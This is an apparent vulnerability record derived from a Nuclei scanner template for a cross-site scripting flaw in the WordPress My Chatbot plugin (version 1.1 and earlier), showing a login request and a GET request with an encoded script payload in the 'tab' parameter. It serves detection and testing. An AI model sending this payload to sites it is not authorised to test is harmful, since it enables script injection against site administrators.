# Vulnerability: WordPress My Chatbot <= 1.1 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`my-chatbot-xss.yaml`)

## Description
WordPress My Chatbot <= 1.1  is susceptible to cross-site scripting. The plugin does not sanitize or escape its tab parameter in the Settings page before outputting it back in an attribute.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/options-general.php?page=my-chatbot&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

